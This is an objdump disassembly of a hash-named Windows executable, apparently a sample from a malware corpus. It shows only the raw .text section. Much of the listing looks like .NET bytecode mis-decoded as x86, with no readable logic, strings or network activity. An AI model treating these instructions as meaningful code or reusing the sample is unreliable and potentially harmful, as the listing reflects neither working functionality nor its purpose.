
2debeb3bd8ee05e342aec360134d65f6f3e637145ebc001f243e21e58d8503f2.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	adc    BYTE PTR [edi+0x0],0x0
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x324800,al
  402013:	add    ah,al
  402015:	and    eax,DWORD PTR [eax]
  402017:	add    BYTE PTR [ebx],cl
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ecx],al
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	test   al,0x28
  402022:	add    BYTE PTR [eax],al
  402024:	lahf   
  402025:	or     DWORD PTR [eax],eax
  402027:	add    BYTE PTR [eax+0x20],dl
  40202a:	add    BYTE PTR [eax],al
  40202c:	add    BYTE PTR [ecx],al
	...
  40204e:	add    BYTE PTR [eax],al
  402050:	sahf   
  402051:	lahf   
  402052:	js     0x402061
  402054:	lahf   
  402055:	push   ebp
  402056:	rcr    DWORD PTR [ecx],0x28
  402059:	(bad)  [ebp-0x16]
  40205c:	loope  0x40208c
  40205e:	mov    ecx,gs
  402060:	mov    ah,0xc1
  402062:	inc    ah
  402064:	sub    eax,0x706e4932
  402069:	ins    BYTE PTR es:[edi],dx
  40206a:	cmp    eax,0x3f58099
  40206f:	dec    esp
  402070:	mov    cl,BYTE PTR [eax-0x71]
  402073:	add    ah,BYTE PTR [edi-0x6daae0bf]
  402079:	mov    al,0x52
  40207b:	clc    
  40207c:	inc    esi
  40207d:	(bad)  
  40207e:	pop    edx
  40207f:	fdiv   QWORD PTR [ecx+0x74f63188]
  402085:	mov    cl,0xda
  402087:	test   DWORD PTR [esi-0x50],esi
  40208a:	pushf  
  40208b:	cs pop ss
  40208d:	les    esi,FWORD PTR [esi]
  40208f:	push   edx
  402090:	rcl    DWORD PTR [eax+0x4b],cl
  402093:	ds daa 
  402095:	pop    ecx
  402096:	cmp    dh,dl
  402098:	or     al,0xca
  40209a:	or     eax,0xa42f5de
  40209f:	xchg   edx,eax
  4020a0:	outs   dx,BYTE PTR ds:[esi]
  4020a1:	mov    ds:0x14aef7ae,al
  4020a6:	(bad)  
  4020a7:	lea    ecx,[eax+0x7fdfb766]
  4020ad:	add    al,0x3f
  4020af:	ficom  DWORD PTR [edi+0xa3ef77c]
  4020b5:	fisub  DWORD PTR [esi+0x24b60a2b]
  4020bb:	pop    ebp
  4020bc:	hlt    
  4020bd:	sar    ch,1
  4020bf:	shl    DWORD PTR [edx*8-0xa42c099],0x29
  4020c7:	ror    DWORD PTR [ebx],1
  4020c9:	and    al,0x2d
  4020cb:	fidivr WORD PTR [edx+0x630fd220]
  4020d1:	or     eax,0x2b1ed6ff
  4020d6:	fisub  WORD PTR [esi+0x4a]
  4020d9:	xchg   ebp,eax
  4020da:	in     al,dx
  4020db:	inc    ebp
  4020dc:	imul   esp,DWORD PTR [esi+0x3c],0x747d57c0
  4020e3:	rol    DWORD PTR [edi+0x3cd5c9e2],1
  4020e9:	sbb    al,0xe0
  4020eb:	mov    al,0xc5
  4020ed:	dec    eax
  4020ee:	out    0x11,eax
  4020f0:	inc    eax
  4020f1:	js     0x40208b
  4020f3:	mov    edi,0x14751f1c
  4020f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f9:	jo     0x4020e9
  4020fb:	jle    0x4020c1
  4020fd:	jne    0x402117
  4020ff:	push   esp
  402100:	mov    ecx,0x573c4dd0
  402105:	xor    al,0xbb
  402107:	add    DWORD PTR [ecx+0x40],edx
  40210a:	sbb    al,0x87
  40210c:	dec    esp
  40210d:	cli    
  40210e:	pop    ss
  40210f:	mov    ebp,0x9a8a4412
  402114:	popf   
  402115:	in     al,dx
  402116:	jmp    0x402150
  402118:	xchg   edx,eax
  402119:	stos   DWORD PTR es:[edi],eax
  40211a:	shr    cl,1
  40211c:	jle    0x402147
  40211e:	mov    eax,ds:0xbae2548b
  402123:	inc    ebx
  402124:	pop    eax
  402125:	sbb    al,0xe7
  402127:	stos   BYTE PTR es:[edi],al
  402128:	add    BYTE PTR [ecx-0x55],cl
  40212b:	mov    esi,0xc3a94da2
  402130:	sub    DWORD PTR [edx+0x734c3ff3],ecx
  402136:	aad    0xba
  402138:	inc    edx
  402139:	adc    eax,0x141e3fdb
  40213e:	rcl    esp,cl
  402140:	int    0x5f
  402142:	dec    ecx
  402143:	xor    BYTE PTR [ecx],ch
  402145:	inc    esi
  402146:	not    BYTE PTR [edi-0x1c]
  402149:	je     0x40216d
  40214b:	sub    DWORD PTR [esi-0x70],ebp
  40214e:	inc    ebp
  40214f:	or     DWORD PTR [ebx],ebx
  402151:	xor    BYTE PTR [edx],al
  402153:	add    BYTE PTR [eax],bh
  402155:	add    BYTE PTR [eax],al
  402157:	add    BYTE PTR [ecx],al
  402159:	add    BYTE PTR [eax],al
  40215b:	adc    DWORD PTR ds:0x16280a,edx
  402161:	add    BYTE PTR [edx],cl
  402163:	sub    BYTE PTR [edi],dl
  402165:	add    BYTE PTR [eax],al
  402167:	or     dh,BYTE PTR [ebx+0xe]
  40216a:	add    BYTE PTR [eax],al
  40216c:	push   es
  40216d:	or     eax,DWORD PTR [edi]
  40216f:	add    ch,BYTE PTR [edi+0x5]
  402172:	add    BYTE PTR [eax],al
  402174:	push   es
  402175:	or     bl,dh
  402177:	adc    eax,0x18280c
  40217c:	add    BYTE PTR [edx],cl
  40217e:	or     BYTE PTR [edi+0x19],ch
  402181:	add    BYTE PTR [eax],al
  402183:	or     ch,BYTE PTR [edi+0x1a]
  402186:	add    BYTE PTR [eax],al
  402188:	or     dl,BYTE PTR ds:0x600de0a
  40218e:	sub    BYTE PTR [ebx],bl
  402190:	add    BYTE PTR [eax],al
  402192:	or     ch,BYTE PTR [edx]
  402194:	add    DWORD PTR [eax],edx
  402196:	add    BYTE PTR [eax],al
  402198:	add    BYTE PTR [eax],al
  40219a:	or     al,0x0
  40219c:	adc    BYTE PTR [eax+eax*1],bl
  40219f:	adc    eax,0x1000021
  4021a4:	push   ds
  4021a5:	add    ch,BYTE PTR [eax]
  4021a7:	sbb    al,0x0
  4021a9:	add    BYTE PTR [edx],cl
  4021ab:	sub    bl,BYTE PTR [esi]
  4021ad:	add    bh,BYTE PTR [ebx+0x1]
  4021b0:	add    BYTE PTR [eax],al
  4021b2:	add    al,0x2a
  4021b4:	and    al,BYTE PTR [edx]
  4021b6:	add    edi,DWORD PTR [ebp+0x1]
  4021b9:	add    BYTE PTR [eax],al
  4021bb:	add    al,0x2a
  4021bd:	add    BYTE PTR [eax],al
  4021bf:	add    BYTE PTR [ebx],dl
  4021c1:	xor    BYTE PTR [edx],al
  4021c3:	add    BYTE PTR [eax+0x0],bl
  4021c6:	add    BYTE PTR [eax],al
  4021c8:	add    al,BYTE PTR [eax]
  4021ca:	add    BYTE PTR [ecx],dl
  4021cc:	add    ch,BYTE PTR [eax]
  4021ce:	add    eax,DWORD PTR [eax]
  4021d0:	add    BYTE PTR [esi],al
  4021d2:	sub    eax,0x1d73020b
  4021d7:	add    BYTE PTR [eax],al
  4021d9:	or     ch,BYTE PTR [eax]
  4021db:	add    al,0x0
  4021dd:	add    BYTE PTR [esi],al
  4021df:	add    al,BYTE PTR [ebx]
  4021e1:	sub    BYTE PTR [esi],al
  4021e3:	add    BYTE PTR [eax],al
  4021e5:	push   es
  4021e6:	or     al,BYTE PTR [esi]
  4021e8:	push   ss
  4021e9:	xor    DWORD PTR [ebx],ebp
  4021eb:	add    ch,BYTE PTR [eax]
  4021ed:	add    eax,DWORD PTR [eax]
  4021ef:	add    BYTE PTR [esi],al
  4021f1:	sub    BYTE PTR [eax],bl
  4021f3:	add    BYTE PTR [eax],al
  4021f5:	or     ch,BYTE PTR [edi+0x1e]
  4021f8:	add    BYTE PTR [eax],al
  4021fa:	or     al,BYTE PTR [edx]
  4021fc:	sub    BYTE PTR [ebx],al
  4021fe:	add    BYTE PTR [eax],al
  402200:	push   es
  402201:	sub    BYTE PTR [edi],bl
  402203:	add    BYTE PTR [eax],al
  402205:	or     ch,BYTE PTR [edi+0x20]
  402208:	add    BYTE PTR [eax],al
  40220a:	or     al,BYTE PTR [edx]
  40220c:	sub    BYTE PTR [ebx],al
  40220e:	add    BYTE PTR [eax],al
  402210:	push   es
  402211:	outs   dx,DWORD PTR ds:[esi]
  402212:	and    DWORD PTR [eax],eax
  402214:	add    BYTE PTR [edx],cl
  402216:	add    ch,BYTE PTR [eax]
  402218:	add    eax,DWORD PTR [eax]
  40221a:	add    BYTE PTR [esi],al
  40221c:	outs   dx,DWORD PTR ds:[esi]
  40221d:	and    al,BYTE PTR [eax]
  40221f:	add    BYTE PTR [edx],cl
  402221:	or     eax,DWORD PTR [edi]
  402223:	sub    dl,BYTE PTR [ebx]
  402225:	xor    BYTE PTR ds:0x1f600,al
  40222b:	add    BYTE PTR [ebx],al
  40222d:	add    BYTE PTR [eax],al
  40222f:	adc    DWORD PTR [esi],edx
  402231:	or     al,BYTE PTR [ebx]
  402233:	mov    gs,WORD PTR [ecx+0x2d]
  402236:	or     edx,DWORD PTR [edi]
  402238:	sub    BYTE PTR [edi],al
  40223a:	add    BYTE PTR [eax],al
  40223c:	push   es
  40223d:	cmp    dl,ah
  40223f:	add    DWORD PTR [eax],eax
  402241:	add    BYTE PTR [esi],dl
  402243:	or     edi,DWORD PTR [eax]
  402245:	rol    BYTE PTR [ecx],cl
  402247:	add    BYTE PTR [eax],al
  402249:	add    eax,DWORD PTR [edi]
  40224b:	call   0x0:0x2328080c
  402252:	or     bh,BYTE PTR [edx]
  402254:	mov    edi,0x16000001
  402259:	or     eax,0x246f08
  40225e:	add    BYTE PTR [edx],cl
  402260:	adc    eax,DWORD PTR [ecx+edx*1]
  402263:	add    al,0x6f
  402265:	and    eax,0x160a0000
  40226a:	xor    DWORD PTR [ecx+edx*1],ebp
  40226d:	add    al,0x16
  40226f:	outs   dx,DWORD PTR ds:[esi]
  402270:	add    BYTE PTR es:[eax],al
  402273:	or     bl,BYTE PTR [edi]
  402275:	pop    esp
  402276:	cs or  al,0x11
  402279:	add    al,0x16
  40227b:	outs   dx,DWORD PTR ds:[esi]
  40227c:	add    BYTE PTR es:[eax],al
  40227f:	or     bl,BYTE PTR [edi]
  402281:	das    
  402282:	xor    edx,DWORD PTR [edx+esi*2]
  402285:	add    DWORD PTR [eax],eax
  402287:	add    BYTE PTR [eax+0x11],dh
  40228a:	add    al,0x17
  40228c:	outs   dx,DWORD PTR ds:[esi]
  40228d:	daa    
  40228e:	add    BYTE PTR [eax],al
  402290:	or     ch,BYTE PTR [eax]
  402292:	sub    BYTE PTR [eax],al
  402294:	add    BYTE PTR [edx],cl
  402296:	adc    eax,DWORD PTR [ecx+edx*1]
  402299:	add    al,0x28
  40229b:	sbb    al,0x0
  40229d:	add    BYTE PTR [esi],al
  40229f:	push   ss
  4022a0:	sub    BYTE PTR [ecx],ch
  4022a2:	add    BYTE PTR [eax],al
  4022a4:	or     ch,BYTE PTR ds:0x380d1807
  4022aa:	ret    
  4022ab:	add    BYTE PTR [eax],al
  4022ad:	add    BYTE PTR [ecx],dl
  4022af:	add    al,0x28
  4022b1:	sbb    eax,0x16060000
  4022b6:	sub    BYTE PTR [ecx],ch
  4022b8:	add    BYTE PTR [eax],al
  4022ba:	or     ch,BYTE PTR ds:0x380d1907
  4022c0:	lods   eax,DWORD PTR ds:[esi]
  4022c1:	add    BYTE PTR [eax],al
  4022c3:	add    BYTE PTR [ecx],dl
  4022c5:	add    al,0x28
  4022c7:	pop    ds
  4022c8:	add    BYTE PTR [eax],al
  4022ca:	push   es
  4022cb:	push   ss
  4022cc:	sub    BYTE PTR [ecx],ch
  4022ce:	add    BYTE PTR [eax],al
  4022d0:	or     ch,BYTE PTR ds:0x380d1a07
  4022d6:	xchg   edi,eax
  4022d7:	add    BYTE PTR [eax],al
  4022d9:	add    BYTE PTR [ecx],dl
  4022db:	add    al,0x28
  4022dd:	and    BYTE PTR [eax],al
  4022df:	add    BYTE PTR [esi],al
  4022e1:	push   ss
  4022e2:	sub    BYTE PTR [ecx],ch
  4022e4:	add    BYTE PTR [eax],al
  4022e6:	or     ch,BYTE PTR ds:0x380d1b07
  4022ec:	add    DWORD PTR [eax],0x4110000
  4022f2:	sub    BYTE PTR [ecx],ah
  4022f4:	add    BYTE PTR [eax],al
  4022f6:	push   es
  4022f7:	push   ss
  4022f8:	sub    BYTE PTR [ecx],ch
  4022fa:	add    BYTE PTR [eax],al
  4022fc:	or     ch,BYTE PTR ds:0x2b0d1c04
  402302:	outs   dx,BYTE PTR ds:[esi]
  402303:	adc    DWORD PTR [eax+ebp*1],eax
  402306:	and    eax,DWORD PTR [eax]
  402308:	add    BYTE PTR [esi],al
  40230a:	push   ss
  40230b:	sub    BYTE PTR [ecx],ch
  40230d:	add    BYTE PTR [eax],al
  40230f:	or     ch,BYTE PTR ds:0x2b0d1d04
  402315:	pop    ebx
  402316:	adc    DWORD PTR [eax+ebp*1],eax
  402319:	and    al,0x0
  40231b:	add    BYTE PTR [esi],al
  40231d:	push   ss
  40231e:	sub    BYTE PTR [ecx],ch
  402320:	add    BYTE PTR [eax],al
  402322:	or     ch,BYTE PTR ds:0x2b0d1e04
  402328:	dec    eax
  402329:	adc    DWORD PTR [eax+ebp*1],eax
  40232c:	and    al,BYTE PTR [eax]
  40232e:	add    BYTE PTR [esi],al
  402330:	push   ss
  402331:	sub    BYTE PTR [ecx],ch
  402333:	add    BYTE PTR [eax],al
  402335:	or     ch,BYTE PTR ds:0xd0a1f05
  40233b:	sub    esi,DWORD PTR [ecx+edx*1]
  40233e:	add    al,0x28
  402340:	add    BYTE PTR es:[eax],al
  402343:	push   es
  402344:	push   ss
  402345:	sub    BYTE PTR [ecx],ch
  402347:	add    BYTE PTR [eax],al
  402349:	or     ch,BYTE PTR ds:0xd091f05
  40234f:	sub    esp,DWORD PTR [eax]
  402351:	adc    DWORD PTR [eax+ebp*1],eax
  402354:	push   ds
  402355:	add    BYTE PTR [eax],al
  402357:	push   es
  402358:	push   ss
  402359:	sub    BYTE PTR [ecx],ch
  40235b:	add    BYTE PTR [eax],al
  40235d:	or     ch,BYTE PTR [edi+ecx*1]
  402360:	adc    DWORD PTR [eax+ebp*1],eax
  402363:	and    eax,0x16060000
  402368:	sub    BYTE PTR [ecx],ch
  40236a:	add    BYTE PTR [eax],al
  40236c:	or     ch,BYTE PTR ds:0x60d1702
  402372:	pop    ss
  402373:	pop    eax
  402374:	or     cl,BYTE PTR [ecx]
  402376:	adc    eax,DWORD PTR ds:0x59170511
  40237c:	inc    ebp
  40237d:	or     al,BYTE PTR [eax]
  40237f:	add    BYTE PTR [eax],al
  402381:	add    al,BYTE PTR [eax]
  402383:	add    BYTE PTR [eax],al
  402385:	or     al,BYTE PTR [eax]
  402387:	add    BYTE PTR [eax],al
  402389:	sbb    BYTE PTR [eax],al
  40238b:	add    BYTE PTR [eax],al
  40238d:	add    BYTE PTR es:[eax],al
  402390:	add    BYTE PTR [esi],ah
  402392:	add    BYTE PTR [eax],al
  402394:	add    BYTE PTR [esi],ah
  402396:	add    BYTE PTR [eax],al
  402398:	add    BYTE PTR [esi],ah
  40239a:	add    BYTE PTR [eax],al
  40239c:	add    BYTE PTR [esi],ah
  40239e:	add    BYTE PTR [eax],al
  4023a0:	add    BYTE PTR [eax+eax*1+0x0],cl
  4023a4:	add    BYTE PTR [ecx],bh
  4023a6:	add    BYTE PTR [eax],al
  4023a8:	add    BYTE PTR [ebx],ch
  4023aa:	pop    ebp
  4023ab:	or     DWORD PTR [eax],ebp
  4023ad:	pop    es
  4023ae:	add    BYTE PTR [eax],al
  4023b0:	push   es
  4023b1:	push   ss
  4023b2:	sub    al,BYTE PTR [edx]
  4023b4:	sub    BYTE PTR [ebx],al
  4023b6:	add    BYTE PTR [eax],al
  4023b8:	push   es
  4023b9:	pop    ss
  4023ba:	outs   dx,DWORD PTR ds:[esi]
  4023bb:	sub    al,BYTE PTR [eax]
  4023bd:	add    BYTE PTR [edx],cl
  4023bf:	sub    edx,DWORD PTR [esi+0x2]
  4023c2:	sub    BYTE PTR [ebx],al
  4023c4:	add    BYTE PTR [eax],al
  4023c6:	push   es
  4023c7:	pop    ss
  4023c8:	outs   dx,DWORD PTR ds:[esi]
  4023c9:	sub    eax,DWORD PTR [eax]
  4023cb:	add    BYTE PTR [edx],cl
  4023cd:	sub    ecx,DWORD PTR [eax+0x2]
  4023d0:	or     DWORD PTR [edx],edx
  4023d2:	add    DWORD PTR [ebx],eax
  4023d4:	or     BYTE PTR [eax],ch
  4023d6:	or     DWORD PTR [eax],eax
  4023d8:	add    BYTE PTR [esi],al
  4023da:	sub    al,0x3b
  4023dc:	pop    es
  4023dd:	pop    ss
  4023de:	pop    eax
  4023df:	or     ebp,DWORD PTR [ebx]
  4023e1:	xor    eax,0x1120902
  4023e6:	add    ecx,DWORD PTR [eax]
  4023e8:	sub    BYTE PTR [ecx],cl
  4023ea:	add    BYTE PTR [eax],al
  4023ec:	push   es
  4023ed:	sub    al,0x28
  4023ef:	pop    es
  4023f0:	pop    ss
  4023f1:	pop    eax
  4023f2:	or     ebp,DWORD PTR [ebx]
  4023f4:	and    al,BYTE PTR [edx]
  4023f6:	or     DWORD PTR [edx],edx
  4023f8:	add    DWORD PTR [ebx],eax
  4023fa:	or     BYTE PTR [eax],ch
  4023fc:	or     DWORD PTR [eax],eax
  4023fe:	add    BYTE PTR [esi],al
  402400:	sub    al,0x15
  402402:	pop    es
  402403:	pop    ss
  402404:	pop    eax
  402405:	or     ebp,DWORD PTR [ebx]
  402407:	clts   
  402409:	pop    ss
  40240a:	pop    ecx
  40240b:	or     cl,BYTE PTR [eax]
  40240d:	sub    BYTE PTR [edx],bl
  40240f:	add    BYTE PTR [eax],al
  402411:	push   es
  402412:	sub    BYTE PTR ds:0x7060000,cl
  402418:	pop    ss
  402419:	pop    eax
  40241a:	or     eax,DWORD PTR [edi]
  40241c:	add    ecx,DWORD PTR [esi-0x1dac097]
  402422:	(bad)  
  402423:	inc    DWORD PTR [esi]
  402425:	sub    al,BYTE PTR [eax]
  402427:	add    BYTE PTR [ebx],dl
  402429:	xor    BYTE PTR [edx],al
  40242b:	add    BYTE PTR ds:0x4000000,cl
  402431:	add    BYTE PTR [eax],al
  402433:	adc    DWORD PTR [edx],eax
  402435:	or     al,BYTE PTR [esi]
  402437:	pop    ss
  402438:	add    DWORD PTR cs:[edx],ebp
  40243b:	sub    BYTE PTR [eax],cl
  40243d:	add    BYTE PTR [eax],al
  40243f:	push   es
  402440:	sub    al,BYTE PTR [edx+0x28]
  402443:	pop    ds
  402444:	add    BYTE PTR [eax],al
  402446:	or     ch,BYTE PTR [eax]
  402448:	daa    
  402449:	add    BYTE PTR [eax],al
  40244b:	push   es
  40244c:	outs   dx,DWORD PTR ds:[esi]
  40244d:	sbb    al,BYTE PTR [eax]
  40244f:	add    BYTE PTR [edx],cl
  402451:	sub    al,BYTE PTR [eax]
  402453:	add    BYTE PTR [ebx],dl
  402455:	xor    BYTE PTR [ebx],al
  402457:	add    bl,al
  402459:	add    BYTE PTR [eax],al
  40245b:	add    BYTE PTR ds:0x4110000,al
  402461:	dec    edx
  402462:	pop    ss
  402463:	pop    eax
  402464:	add    eax,0xe32698e
  402469:	push   cs
  40246a:	add    al,0x28
  40246c:	adc    al,0x0
  40246e:	add    BYTE PTR [esi],al
  402470:	sub    BYTE PTR ds:0x16060000,cl
  402476:	sub    al,BYTE PTR ds:0x58174a04
  40247c:	call   0x0:0x2328060a
  402483:	or     ch,BYTE PTR [esi+ecx*1]
  402486:	push   cs
  402487:	add    al,0x28
  402489:	pop    ss
  40248a:	add    BYTE PTR [eax],al
  40248c:	push   es
  40248d:	sub    BYTE PTR ds:0x16060000,cl
  402493:	sub    al,BYTE PTR [ebx]
  402495:	or     al,0x8
  402497:	sbb    bl,BYTE PTR [ecx+0x45]
  40249a:	pop    es
  40249b:	add    BYTE PTR [eax],al
  40249d:	add    BYTE PTR [edx],al
  40249f:	add    BYTE PTR [eax],al
  4024a1:	add    BYTE PTR ds:0x23000000,dl
  4024a7:	add    BYTE PTR [eax],al
  4024a9:	add    BYTE PTR [edi],dh
  4024ab:	add    BYTE PTR [eax],al
  4024ad:	add    BYTE PTR [edi],dh
  4024af:	add    BYTE PTR [eax],al
  4024b1:	add    BYTE PTR [ebp+0x0],dl
  4024b4:	add    BYTE PTR [eax],al
  4024b6:	pop    esi
  4024b7:	add    BYTE PTR [eax],al
  4024b9:	add    BYTE PTR [ebx],ch
  4024bb:	add    ch,BYTE PTR gs:[eax]
  4024be:	add    eax,DWORD PTR [eax]
  4024c0:	add    BYTE PTR [esi],al
  4024c2:	outs   dx,DWORD PTR ds:[esi]
  4024c3:	sub    al,0x0
  4024c5:	add    BYTE PTR [edx],cl
  4024c7:	push   es
  4024c8:	outs   dx,DWORD PTR ds:[esi]
  4024c9:	sub    eax,0x2b0a0000
  4024ce:	push   edx
  4024cf:	add    ch,BYTE PTR [eax]
  4024d1:	add    eax,DWORD PTR [eax]
  4024d3:	add    BYTE PTR [esi],al
  4024d5:	push   es
  4024d6:	outs   dx,DWORD PTR ds:[esi]
  4024d7:	add    BYTE PTR cs:[eax],al
  4024da:	or     ch,BYTE PTR [ebx]
  4024dc:	inc    esp
  4024dd:	add    ch,BYTE PTR [eax]
  4024df:	add    eax,DWORD PTR [eax]
  4024e1:	add    BYTE PTR [esi],al
  4024e3:	add    al,BYTE PTR [esi]
  4024e5:	sub    BYTE PTR [eax+eax*1],cl
  4024e8:	add    BYTE PTR [esi],al
  4024ea:	outs   dx,DWORD PTR ds:[esi]
  4024eb:	das    
  4024ec:	add    BYTE PTR [eax],al
  4024ee:	or     ch,BYTE PTR [ebx]
  4024f0:	xor    BYTE PTR [esi],al
  4024f2:	add    ebx,DWORD PTR ds:0x307301fe
  4024f8:	add    BYTE PTR [eax],al
  4024fa:	or     cl,BYTE PTR [ebx]
  4024fc:	add    ch,BYTE PTR [eax]
  4024fe:	add    eax,DWORD PTR [eax]
  402500:	add    BYTE PTR [esi],al
  402502:	outs   dx,DWORD PTR ds:[esi]
  402503:	xor    DWORD PTR [eax],eax
  402505:	add    BYTE PTR [edx],cl
  402507:	pop    es
  402508:	outs   dx,DWORD PTR ds:[esi]
  402509:	xor    al,BYTE PTR [eax]
  40250b:	add    BYTE PTR [edx],cl
  40250d:	sub    edx,DWORD PTR [edx]
  40250f:	add    al,BYTE PTR [esi]
  402511:	sub    BYTE PTR [edx],cl
  402513:	add    BYTE PTR [eax],al
  402515:	push   es
  402516:	sub    ecx,DWORD PTR [ecx]
  402518:	add    al,BYTE PTR [ebx]
  40251a:	push   es
  40251b:	sub    BYTE PTR [ebx],cl
  40251d:	add    BYTE PTR [eax],al
  40251f:	push   es
  402520:	sub    dl,BYTE PTR [edi]
  402522:	sub    al,BYTE PTR [eax]
  402524:	sbb    esi,DWORD PTR [eax]
  402526:	add    al,BYTE PTR [eax]
  402528:	xor    DWORD PTR [eax],eax
  40252a:	add    BYTE PTR [eax],al
  40252c:	push   es
  40252d:	add    BYTE PTR [eax],al
  40252f:	adc    DWORD PTR [ebx],eax
  402531:	jae    0x402566
  402533:	add    BYTE PTR [eax],al
  402535:	or     cl,BYTE PTR [edx]
  402537:	sub    BYTE PTR [esi],dl
  402539:	add    BYTE PTR [eax],al
  40253b:	or     al,BYTE PTR [esi]
  40253d:	outs   dx,DWORD PTR ds:[esi]
  40253e:	xor    al,0x0
  402540:	add    BYTE PTR [edx],cl
  402542:	ficomp WORD PTR [esi+eiz*1]
  402545:	add    ebp,DWORD PTR [eax]
  402547:	push   ss
  402548:	add    BYTE PTR [eax],al
  40254a:	push   es
  40254b:	sub    BYTE PTR ds:0xde060000,cl
  402551:	push   cs
  402552:	add    ebp,DWORD PTR es:[eax]
  402555:	adc    eax,DWORD PTR [eax]
  402557:	add    BYTE PTR [esi],al
  402559:	sub    BYTE PTR ds:0xde060000,cl
  40255f:	add    BYTE PTR [edx],ch
  402561:	add    BYTE PTR [eax],al
  402563:	add    BYTE PTR [ecx],al
  402565:	sbb    al,0x0
  402567:	add    BYTE PTR [eax],al
  402569:	add    BYTE PTR [eax],al
  40256b:	add    BYTE PTR [esp+edx*1],dl
  40256e:	add    BYTE PTR [esi],cl
  402570:	daa    
  402571:	add    BYTE PTR [eax],al
  402573:	add    DWORD PTR [eax],eax
  402575:	add    BYTE PTR [eax],al
  402577:	add    BYTE PTR [edx+eiz*1],dl
  40257a:	add    BYTE PTR [esi],cl
  40257c:	sub    BYTE PTR [eax],al
  40257e:	add    BYTE PTR [ecx],al
  402580:	adc    esi,DWORD PTR [eax]
  402582:	add    eax,DWORD PTR [eax]
  402584:	jb     0x402586
  402586:	add    BYTE PTR [eax],al
  402588:	pop    es
  402589:	add    BYTE PTR [eax],al
  40258b:	adc    DWORD PTR [edi+ebx*1],eax
  40258e:	cmp    eax,0x356f
  402593:	or     cl,BYTE PTR [edx]
  402595:	push   es
  402596:	push   ss
  402597:	das    
  402598:	or     eax,0x152804
  40259d:	add    BYTE PTR [esi],al
  40259f:	sub    BYTE PTR ds:0x16060000,cl
  4025a5:	sub    al,BYTE PTR [esi+edx*1]
  4025a8:	push   es
  4025a9:	outs   dx,DWORD PTR ds:[esi]
  4025aa:	add    BYTE PTR ss:[eax],al
  4025ad:	or     cl,BYTE PTR [ebx]
  4025af:	pop    es
  4025b0:	sub    BYTE PTR [ebx],ah
  4025b2:	add    BYTE PTR [eax],al
  4025b4:	or     ch,BYTE PTR [ecx*1+0x182804]
  4025bb:	add    BYTE PTR [esi],al
  4025bd:	sub    BYTE PTR ds:0x16060000,cl
  4025c3:	sub    al,BYTE PTR [esi+eax*1]
  4025c6:	pop    ss
  4025c7:	pop    eax
  4025c8:	outs   dx,DWORD PTR ds:[esi]
  4025c9:	daa    
  4025ca:	add    BYTE PTR [eax],al
  4025cc:	or     cl,BYTE PTR [eax+ecx*1]
  4025cf:	sub    BYTE PTR [ebx],ah
  4025d1:	add    BYTE PTR [eax],al
  4025d3:	or     ch,BYTE PTR [ecx*1+0x192804]
  4025da:	add    BYTE PTR [esi],al
  4025dc:	sub    BYTE PTR ds:0x16060000,cl
  4025e2:	sub    al,BYTE PTR [ebx]
  4025e4:	or     eax,0x330a1f09
  4025e9:	adc    al,BYTE PTR [edx]
  4025eb:	sub    BYTE PTR [ebx],al
  4025ed:	add    BYTE PTR [eax],al
  4025ef:	push   es
  4025f0:	outs   dx,DWORD PTR ds:[esi]
  4025f1:	aaa    
  4025f2:	add    BYTE PTR [eax],al
  4025f4:	or     al,BYTE PTR [edi]
  4025f6:	or     BYTE PTR [edi+0x38],ch
  4025f9:	add    BYTE PTR [eax],al
  4025fb:	or     dl,BYTE PTR [edi]
  4025fd:	sub    al,BYTE PTR [eax]
  4025ff:	add    BYTE PTR [ebx],bl
  402601:	xor    BYTE PTR [ebx],al
  402603:	add    BYTE PTR [ebx],ch
  402605:	add    BYTE PTR [eax],al
  402607:	add    BYTE PTR [eax],cl
  402609:	add    BYTE PTR [eax],al
  40260b:	adc    DWORD PTR [esi],edx
  40260d:	or     dl,al
  40260f:	add    al,0x0
  402611:	add    BYTE PTR [ecx],al
  402613:	sub    BYTE PTR [ecx],bh
  402615:	add    BYTE PTR [eax],al
  402617:	or     al,BYTE PTR [ebx]
  402619:	pop    ss
  40261a:	sub    BYTE PTR [edx],bh
  40261c:	add    BYTE PTR [eax],al
  40261e:	or     ah,BYTE PTR [ebp+0x1000004]
  402624:	or     bl,dh
  402626:	push   cs
  402627:	add    ebp,DWORD PTR es:[eax]
  40262a:	sbb    eax,DWORD PTR [eax]
  40262c:	add    BYTE PTR [esi],al
  40262e:	sub    BYTE PTR ds:0xde060000,cl
  402634:	add    BYTE PTR [esi],al
  402636:	sub    al,BYTE PTR [eax]
  402638:	add    DWORD PTR [eax],edx
  40263a:	add    BYTE PTR [eax],al
  40263c:	add    BYTE PTR [eax],al
  40263e:	add    al,BYTE PTR [eax]
  402640:	sbb    DWORD PTR [ebx],ebx
  402642:	add    BYTE PTR [esi],cl
  402644:	and    DWORD PTR [eax],eax
  402646:	add    BYTE PTR [ecx],al
  402648:	adc    esi,DWORD PTR [eax]
  40264a:	add    eax,0x2700
  40264f:	add    BYTE PTR [ecx],cl
  402651:	add    BYTE PTR [eax],al
  402653:	adc    DWORD PTR [eax],ebp
  402655:	cmp    eax,DWORD PTR [eax]
  402657:	add    BYTE PTR [edx],cl
  402659:	jb     0x402660
  40265b:	add    BYTE PTR [eax],al
  40265d:	jo     0x402677
  40265f:	lea    eax,[ecx]
  402661:	add    BYTE PTR [eax],al
  402663:	add    DWORD PTR [ebx],ecx
  402665:	pop    es
  402666:	push   ss
  402667:	add    ah,BYTE PTR [edx-0x5dfce8f9]
  40266d:	pop    es
  40266e:	sub    BYTE PTR [eax+eax*1],bh
  402671:	add    BYTE PTR [edx],cl
  402673:	or     al,BYTE PTR [esi]
  402675:	jae    0x4026b4
  402677:	add    BYTE PTR [eax],al
  402679:	or     bh,BYTE PTR [edx+0x1e]
  40267c:	add    ch,BYTE PTR [eax]
  40267e:	sbb    al,0x0
  402680:	add    BYTE PTR [edx],cl
  402682:	sub    bl,BYTE PTR [esi]
  402684:	add    ch,BYTE PTR [eax]
  402686:	sbb    al,0x0
  402688:	add    BYTE PTR [edx],cl
  40268a:	sub    al,BYTE PTR [eax]
  40268c:	adc    esi,DWORD PTR [eax]
  40268e:	add    al,BYTE PTR [eax]
  402690:	xor    eax,DWORD PTR [eax]
